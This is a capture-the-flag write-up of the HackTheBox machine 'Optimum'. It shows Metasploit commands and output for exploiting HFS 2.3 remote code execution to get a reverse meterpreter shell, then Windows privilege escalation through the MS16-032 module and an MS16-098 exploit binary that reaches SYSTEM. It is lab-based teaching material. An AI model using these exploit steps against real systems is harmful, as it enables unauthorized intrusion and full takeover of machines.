---
layout: post
title:  "HackTheBox - Optimum"
date:   2017-12-25 00:00:00 +0100
categories: hackthebox
image:
  feature: optimum.jpg
  credit:
  creditlink:
---

This post describes multiple attacks upon the Optimum box on [hackthebox.eu](http://hackthebox.eu).  

Introduction
==========
This is a particularly interesting box.  Getting a shell is easy, perhaps one of the easiest on the site, but escalating evades a number of people, despite, in theory, also being very easy.  Originally, I cracked this box in a non-intended manner, so there are multiple ways of achieving the same result.  What you should take away from this box is that the details are important and you can't let exploit kits do all the heavy lifting for you.  With that out of the way, lets get onto the exploitation.
	

Enumeration
=====
```bash
PORT   STATE SERVICE    VERSION
80/tcp open  tcpwrapped
|_http-server-header: HFS 2.3
|_http-title: HFS /
```

So this gives us one service, a HFS file server.  A quick search reveals that this version, v2.3, is in fact vulnerable to [remote code execution](https://www.exploit-db.com/exploits/39161/).  That's pretty handy, so we can likely get a shell very quickly.  A further search reveals that this version also has a [metasploit module](https://www.rapid7.com/db/modules/exploit/windows/http/rejetto_hfs_exec) for it, so we can get a meterpreter shell even easier, and considering it's a windows box, that's a life-saver (I'll kick the habit some day I swear!!).  So let's run the module and have a look around.

```bash
msf exploit(rejetto_hfs_exec) > show options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST                       yes       The target address
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```
There doesn't appear to be much we need to set here bar the RHOST.  We're assuming from nmap that the TARGETURI is simply /, and it doesn't take more than a quick run to confirm this.

```bash
msf exploit(rejetto_hfs_exec) > set RHOST 10.10.10.8
RHOST => 10.10.10.8

msf exploit(rejetto_hfs_exec) > exploit

[*] Started reverse TCP handler on 10.10.13.202:4444 
[*] Using URL: http://0.0.0.0:8080/HathpeeW54bHa75
[*] Local IP: http://192.168.117.130:8080/HathpeeW54bHa75
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /HathpeeW54bHa75
[*] Sending stage (957487 bytes) to 10.10.10.8
[*] Meterpreter session 1 opened (10.10.13.202:4444 -> 10.10.10.8:49189) at 2017-05-18 18:02:39 +0100
```

Boom we have a shell!  Now lets escalate!

Privilege Escalation - Method 1
=======
I spent a lot of time rooting (hehehehe) around on this box, but came to the conclusion that it absolutely had to be vulnerable to [MS16-032](https://www.rapid7.com/db/modules/exploit/windows/local/ms16_032_secondary_logon_handle_privesc), but couldn't for the life of me get it to work.  The device wasn't patched recently, and the exploit was famous for being fairly consistently, so in my head it had to work.  I tried the [powershell exploit](https://www.exploit-db.com/exploits/39719/) and the [metasploit one](https://www.rapid7.com/db/modules/exploit/windows/local/ms16_032_secondary_logon_handle_privesc), but nothing gave me a shell.  Hindsight is 20/20, and while I initially exploited it via the second, it's a good idea to see how both methods work.

Exploiting the metasploit module requires a number of different options set.  Firstly, we need to ensure we have a 64 bit meterpreter.  We can just set this before we run the rejetto hfs exploit to give us a shell.

```
msf exploit(rejetto_hfs_exec) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
```
So now we absolutely have an x64 based shell, after some enumeration using systeminfo and `post/multi/recon/local_exploit_suggester`, we discover that the machine is vulnerable to [MS16-032](https://www.rapid7.com/db/modules/exploit/windows/local/ms16_032_secondary_logon_handle_privesc).  So lets background the shell and load up this module.

```
meterpreter > background 
[*] Backgrounding session 2...
msf exploit(rejetto_hfs_exec) > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
msf exploit(ms16_032_secondary_logon_handle_privesc) > show options

Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.


Exploit target:

   Id  Name
   --  ----
   0   Windows x86


msf exploit(ms16_032_secondary_logon_handle_privesc) > set SESSION 2
SESSION => 2
msf exploit(ms16_032_secondary_logon_handle_privesc) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Windows x86
   1   Windows x64
```

From this, we see that the machine has two targets, one for x86 and one for x64.  Since, obviously, we're targeting an x64 based machine we need to select the correct target.

```bash
msf exploit(ms16_032_secondary_logon_handle_privesc) > set target 1
target => 1
```

So now we just run the exploit the exploit and we'll pop a system shell.

Privilege Escalation - Method 2
=====
An absolutely fantastic tool is windows-exploit-suggester.  It takes the list of patches output by systeminfo, and compares this to a database of microsoft patches, attempting to supply a list of exploits to target the machine.  This is an inefficient method, but at the time whilst desperately searching for an exploit, it gave me a way of more effectively targeting my search.  

Run `systeminfo` in a shell on the remote pc, and save it in a file called 'systeminfo.txt' on your local machine.

```bash
root@kali:~/Windows-Exploit-Suggester-master# python windows-exploit-suggester.py --database 2017-05-25-mssb.xls --systeminfo systeminfo.txt 
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (ascii)
[*] querying database file for potential vulnerabilities
[*] comparing the 32 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits
[*] there are now 246 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2012 R2 64-bit'
[*] 
[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255
[*] 
[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)
[E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important
[M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical
-- SNIP---
[*] done
```

The method I used here probably isn't as applicable to real-world as I'd want, considering a couple of these crashed Optimum but gave me no shell.  But luckily, very shortly down the list, is MS16-098, which gave me a shell, and them promptly crashed the box once I exited.  So nowhere near as stable as MS16-032 but another entry point into the box.

Exploiting this was simply a matter of downloading the executable from the remote site (we probably should compile it ourselves in future), using meterpreter to upload and then running the executable.

```bash
C:\Users\kostas\Desktop>41020.exe
41020.exe
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>whoami
whoami
nt authority\system
```
